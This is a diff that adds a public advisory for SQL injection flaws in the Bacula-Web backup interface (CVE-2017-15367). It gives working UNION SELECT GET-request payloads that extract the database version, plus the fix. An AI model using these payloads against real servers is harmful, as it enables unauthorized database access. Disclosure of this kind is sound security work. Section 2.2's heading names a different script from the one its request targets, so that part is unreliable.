@@ -1,0 +1,55 @@
+# Exploit Title: Multiple SQL injection vulnerabilities in Bacula-Web
+# Date: 2018-03-07
+# Software Link: http://bacula-web.org/
+# Exploit Author: Gustavo Sorondo
+# Contact: http://twitter.com/iampuky
+# Website: http://cintainfinita.com/
+# CVE: CVE-2017-15367
+# Category: webapps
+
+1. Description
+
+Bacula-web before 8.0.0-rc2 is affected by multiple SQL Injection
+vulnerabilities that could allow an attacker to access the Bacula database
+and, depending on configuration, escalate privileges on the server.
+
+2. Proofs of Concept
+
+2.1) The /jobs.php script is affected by a SQL Injection vulnerability.
+
+The following GET request can be used to extract the result of "select
+@@version" query.
+
+Request:
+GET
+/jobs.php?status=0&level_id=&client_id=0&start_time=&end_time=&orderby=jobid&jobs_per_page=25&pool_id=11%27%20UNION%20ALL%20SELECT%20@@version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
+HTTP/1.1
+
+Response:
+HTTP/1.1 200 OK
+[...]
+            <td>5.7.19-0ubuntu0.16.04.1</td>
+            <td class="text-left">
+             backupjob-report.php?backupjob_name=
+[...]
+
+Other parameters (eg. client_id) are also vulnerable, since there is no
+protection against SQL Injections at all.
+
+2.2) The /backupjob-report.php script is affected by a SQL Injection
+vulnerability.
+
+The following GET request can be used to extract the result of "select
+@@version" query.
+
+Request:
+GET
+/client-report.php?period=7&client_id=21%20UNION%20ALL%20SELECT%20NULL,@@version%23
+
+2.3) The /client-report.php is affected by a SQL Injection vulnerability in
+the "client_id" parameter.
+
+3. Solution:
+
+Update to version 8.0.0-RC2
+http://bacula-web.org/news-reader/bacula-web-8-0-0-rc2-released.html
